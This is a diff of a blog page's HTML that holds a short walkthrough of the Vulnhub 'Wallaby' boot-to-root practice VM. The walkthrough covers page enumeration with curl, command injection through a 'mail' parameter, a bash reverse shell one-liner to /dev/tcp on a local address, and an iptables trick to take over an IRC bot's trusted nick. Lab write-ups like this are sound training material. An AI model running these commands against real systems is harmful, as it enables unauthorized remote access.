@@ -1,22 +1,11 @@
 <!DOCTYPE html>
 <html lang="en">
     <head>
-        
-
-<script async src="https://www.googletagmanager.com/gtag/js?id=UA-12497311-8"></script>
-<script>
-  window.dataLayer = window.dataLayer || [];
-  function gtag(){dataLayer.push(arguments);}
-  gtag('js', new Date());
-
-  gtag('config', 'UA-12497311-8');
-</script>
-
-<meta charset="UTF-8">
+        <meta charset="UTF-8">
 <meta http-equiv="X-UA-Compatible" content="ie=edge">
 <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
 <meta name="author" content="[audible]blink ">
-<meta name="description" content="Executive Summary This machine had an unlisted but open webapp path that allowed for remote command execution. After establishing a reverse shell as the limited user www-data, privilege checks showed the user was allowed to modify firewall rules. There was also an IRC server that contained a bot that allowed command execution through the use of the .run command. The command would only obey the user waldo so modification of the firewall allows an attacker to kick and assume the waldo identity." />
+<meta name="description" content="A walkthrough of the Wallaby VM from Vulnhub" />
 <meta name="keywords" content="hacking, blog, science, infosec, development, programming" />
 <meta name="robots" content="noodp" />
 <meta name="theme-color" content="" />
@@ -31,28 +20,29 @@
 
 
 
-<link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.2.1/css/flag-icon.min.css" rel="stylesheet"
+<link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.5.0/css/flag-icon.min.css" rel="stylesheet"
     type="text/css">
 
 
 
-<link rel="stylesheet" href="/main.min.5dcefbf8102eb536dd3e2de53ffebfa58599ab2435c241a0db81728a5e015f2e.css">
+<link rel="stylesheet" href="/main.0dbe19bf135ce9f0272c4f7c4b805c55427a2a421a96241af7daa8532e45dea9.css">
+
+
 
 
 
 
 <meta itemprop="name" content="B2R: Wallaby Walkthrough">
-<meta itemprop="description" content="A walkthrough of the Wallaby VM from Vulnhub">
-<meta itemprop="datePublished" content="2016-12-30T19:16:02-04:00" />
+<meta itemprop="description" content="A walkthrough of the Wallaby VM from Vulnhub"><meta itemprop="datePublished" content="2016-12-30T19:16:02-04:00" />
 <meta itemprop="dateModified" content="2016-12-30T19:16:02-04:00" />
 <meta itemprop="wordCount" content="639">
-
-
-
 <meta itemprop="keywords" content="" />
 <meta name="twitter:card" content="summary"/>
 <meta name="twitter:title" content="B2R: Wallaby Walkthrough"/>
 <meta name="twitter:description" content="A walkthrough of the Wallaby VM from Vulnhub"/>
+
+
+
 
 
 
@@ -71,7 +61,10 @@
 
     </head>
 
-    <body class="dark-theme">
+    
+        <body>
+    
+    
         <div class="container">
             <header class="header">
     <span class="header__inner">
@@ -80,7 +73,11 @@
         
             <span class="logo__mark">></span>
             <span class="logo__text">$ cd ~/</span>
-            <span class="logo__cursor" style=""></span>
+            <span class="logo__cursor" style=
+                  "
+                   
+                   ">
+            </span>
         
     </div>
 </a>
@@ -89,7 +86,7 @@
         <span class="header__right">
             
                 <nav class="menu">
-    <ul class="menu__inner"><li><a href="https://sec.alexflor.es/posts/">Posts</a></li>
+    <ul class="menu__inner"><li><a href="/posts/">Posts</a></li>
     </ul>
 </nav>
 
@@ -100,13 +97,6 @@
                     </svg>
                 </span>
             
-
-            <span class="theme-toggle unselectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
-  <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
-  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
-  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
-</svg>
-</span>
         </span>
     </span>
 </header>
@@ -114,25 +104,33 @@
 
             <div class="content">
                 
-    <main class="post">
+  <main class="post">
 
-        <div class="post-info">
-            <p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-clock"><circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline></svg>3 minutes
+    <div class="post-info">
+      <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-clock">
+          <circle cx="12" cy="12" r="10"></circle>
+          <polyline points="12 6 12 12 16 14"></polyline>
+        </svg>
+        3 minutes
 
-            
+        
+      </p>
+    </div>
 
-            </p>
-        </div>
+    <article>
+      <h1 class="post-title">
+        <a href="https://sec.alexflor.es/posts/2016/12/b2r-wallaby-walkthrough/">B2R: Wallaby Walkthrough</a>
+      </h1>
 
-        <article>
-            <h1 class="post-title">
-                <a href="https://sec.alexflor.es/posts/2016/12/b2r-wallaby-walkthrough/">B2R: Wallaby Walkthrough</a>
-            </h1>
+      
+        <div class="post-excerpt">A walkthrough of the Wallaby VM from Vulnhub</div>
+      
 
-            
+      
 
-            <div class="post-content">
-                <h2 id="executive-summary">Executive Summary</h2>
+      <div class="post-content">
+        <h2 id="executive-summary">Executive Summary</h2>
 <p>This machine had an unlisted but open webapp path that allowed for remote command execution. After
 establishing a reverse shell as the limited user <code>www-data</code>, privilege checks showed the user was allowed to
 modify firewall rules. There was also an IRC server that contained a bot that allowed command execution
@@ -156,7 +154,7 @@ automated tools were going to make this challenge harder, not easier.</p>
 <p><img src="https://i.imgur.com/WwMxNnj.png" alt="">
 <img src="https://i.imgur.com/IS2BlBh.png" alt=""></p>
 <p>At this point, I decided to automate my enumeration of pages with a custom script.</p>
-<pre><code class="language-bash.prettyprint" data-lang="bash.prettyprint">for word in $(cat /usr/share/dirb/wordlists/common.txt); do
+<pre tabindex="0"><code class="language-bash.prettyprint" data-lang="bash.prettyprint">for word in $(cat /usr/share/dirb/wordlists/common.txt); do
     
     # find pages whose last line does NOT contain the phrase 'what are you trying' ( a 404, essentially )
     curl -q &quot;vm:60080/?page=$word&quot; 2&gt;/dev/null | tail -1 | grep -v 'what are you trying'
@@ -167,7 +165,7 @@ automated tools were going to make this challenge harder, not easier.</p>
     fi
 done | grep -v &quot;/&quot; # don't print results with slashes in them, they're false positives
 </code></pre><p>This output yielded the pages.</p>
-<pre><code class="language-bash.prettyprint" data-lang="bash.prettyprint">contact
+<pre tabindex="0"><code class="language-bash.prettyprint" data-lang="bash.prettyprint">contact
 mailer
 home
 index
@@ -179,7 +177,7 @@ name
 <p><img src="https://i.imgur.com/9Yu6Zky.png" alt=""></p>
 <p>From here we can set up a listener and run a reverse shell by feeding in url encoded commands to the <code>mail</code>
 query parameter:</p>
-<pre><code class="language-bash.prettyprint" data-lang="bash.prettyprint">bash -c &quot;bash -i &gt;&amp; /dev/tcp/192.168.1.177/443 0&gt;&amp;1&quot;
+<pre tabindex="0"><code class="language-bash.prettyprint" data-lang="bash.prettyprint">bash -c &quot;bash -i &gt;&amp; /dev/tcp/192.168.1.177/443 0&gt;&amp;1&quot;
 
 # becomes
 
@@ -198,7 +196,7 @@ machine.</p>
 <p>The code for the and configs for the bot are located in <code>/home/wallaby/.sopel</code> and it indicates that we need
 to assume the nickname <code>waldo</code> in order for us to be able to use this command. We can&rsquo;t do that while waldo
 is still logged in so we boot them off with the use of our firewall.</p>
-<pre><code class="language-bash.prettyprint" data-lang="bash.prettyprint">sudo iptables -I OUTPUT -p tcp -m owner --uid-owner 1000 --dport 6667 -s 127.0.0.1 -j DROP
+<pre tabindex="0"><code class="language-bash.prettyprint" data-lang="bash.prettyprint">sudo iptables -I OUTPUT -p tcp -m owner --uid-owner 1000 --dport 6667 -s 127.0.0.1 -j DROP
 </code></pre><p><img src="https://i.imgur.com/KCH7TX6.png" alt=""></p>
 <p>In a while, after a timeout, only <code>waldo</code> should be ejected from the room, leaving the ability to steal his
 nick and command the bot.</p>
@@ -217,49 +215,109 @@ out-of-scope API. It does not run the python command on the target machine.</li>
 <li>There are at least 3 ways to get a limited shell and at least 2 to get root.</li>
 </ul>
 
-            </div>
-        </article>
+      </div>
+    </article>
 
-        <hr />
+    <hr />
 
-        <div class="post-info">
+    <div class="post-info">
+      
+      
+    <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-folder meta-icon"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"></path></svg>
 
-            <p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file-text"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path><polyline points="14 2 14 8 20 8"></polyline><line x1="16" y1="13" x2="8" y2="13"></line><line x1="16" y1="17" x2="8" y2="17"></line><polyline points="10 9 9 9 8 9"></polyline></svg>639 Words</p>
+        <span class="tag"><a href="https://sec.alexflor.es/categories/boot2root/">Boot2Root</a></span>
+        
+    </p>
 
-            <p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar"><rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line></svg>2016-12-30 18:16 -0500</p>
+
+      <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file-text">
+          <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path>
+          <polyline points="14 2 14 8 20 8"></polyline>
+          <line x1="16" y1="13" x2="8" y2="13"></line>
+          <line x1="16" y1="17" x2="8" y2="17"></line>
+          <polyline points="10 9 9 9 8 9"></polyline>
+        </svg>
+        639 Words
+      </p>
+
+      <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar">
+          <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect>
+          <line x1="16" y1="2" x2="16" y2="6"></line>
+          <line x1="8" y1="2" x2="8" y2="6"></line>
+          <line x1="3" y1="10" x2="21" y2="10"></line>
+        </svg>
+        
+          2016-12-30 18:16
+        
+
+         
+          
+        
+      </p>
+    </div>
+
+    
+    <div class="pagination">
+        <div class="pagination__title">
+            <span class="pagination__title-h"></span>
+            <hr />
         </div>
 
-        
-            <div class="pagination">
-                <div class="pagination__title">
-                    <span class="pagination__title-h"></span>
-                    <hr />
-                </div>
+        <div class="pagination__buttons">
+            
+            <span class="button previous">
+                <a href="https://sec.alexflor.es/posts/2017/02/configuring-ssh-for-pivoting/">
+                    <span class="button__icon">←</span>
+                    <span class="button__text">Configuring SSH for Pivoting</span>
+                </a>
+            </span>
+            
 
-                <div class="pagination__buttons">
-                    
-                        <span class="button previous">
-                            <a href="https://sec.alexflor.es/posts/2017/02/configuring-ssh-for-pivoting/">
-                                <span class="button__icon">←</span>
-                                <span class="button__text">Configuring SSH for Pivoting</span>
-                            </a>
-                        </span>
-                    
+            
+            <span class="button next">
+                <a href="https://sec.alexflor.es/posts/2016/12/b2r-stapler/">
+                    <span class="button__text">B2R: Stapler</span>
+                    <span class="button__icon">→</span>
+                </a>
+            </span>
+            
+        </div>
+    </div>
 
-                    
-                        <span class="button next">
-                            <a href="https://sec.alexflor.es/posts/2016/12/b2r-stapler/">
-                                <span class="button__text">B2R: Stapler</span>
-                                <span class="button__icon">→</span>
-                            </a>
-                        </span>
-                    
-                </div>
-            </div>
-        
 
-        
-    </main>
+    
+      
+        <div id="comments">
+          <div id="disqus_thread"></div>
+<script type="application/javascript">
+    var disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "blinksec" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+        </div>
+      
+    
+
+    
+
+  </main>
 
             </div>
 
@@ -268,21 +326,12 @@ out-of-scope API. It does not run the python command on the target machine.</li>
     <div class="footer__inner">
         <div class="footer__content">
             <span>&copy; 2021</span>
-            
-                <span><a href="https://sec.alexflor.es">[audible]blink</a></span>
-            
-            <span></span>
-            <span> <a href="https://sec.alexflor.es/posts/index.xml" target="_blank" title="rss"><svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 20 20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 0 1 9 9"></path><path d="M4 4a16 16 0 0 1 16 16"></path><circle cx="5" cy="19" r="1"></circle></svg></a></span>
+            <span><a href="https://sec.alexflor.es">[audible]blink</a></span>
+            <span><a href="https://sec.alexflor.es/posts/index.xml" target="_blank" title="rss"><svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 20 20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 0 1 9 9"></path><path d="M4 4a16 16 0 0 1 16 16"></path><circle cx="5" cy="19" r="1"></circle></svg></a></span>
         </div>
     </div>
     <div class="footer__inner">
         <div class="footer__content">
-
-  <div style="margin-top: 1em;" class="container has-text-centered">
-            <img src="https://www.hackthebox.eu/badge/image/1496" alt="Hack The Box">
-  </div>
-
-
         </div>
     </div>
 </footer>
@@ -294,8 +343,20 @@ out-of-scope API. It does not run the python command on the target machine.</li>
 
 
 
-
-<script type="text/javascript" src="/bundle.min.2d5469329143160ae2456a69c3c76dc2d0a3b212b46afe291a51bd68650ed6f8697e001dab54f1c272c77ce08092a8c55e5bb4314e0ee334aab4b927ec896638.js" integrity="sha512-LVRpMpFDFgriRWppw8dtwtCjshK0av4pGlG9aGUO1vhpfgAdq1TxwnLHfOCAkqjFXlu0MU4O4zSqtLkn7IlmOA=="></script>
+<script type="text/javascript" src="/bundle.min.599099f1f14b78b657d524b28e10e0c5098e7cd46e9c7aed73d577068a276c3ff1bb234cbf29cb313333e83cf411727b43157c91ce5b809e2ffc81664614608e.js" integrity="sha512-WZCZ8fFLeLZX1SSyjhDgxQmOfNRunHrtc9V3BoonbD/xuyNMvynLMTMz6Dz0EXJ7QxV8kc5bgJ4v/IFmRhRgjg=="></script>
+    
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+	ga('create', 'UA-12497311-8', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
 
 
 
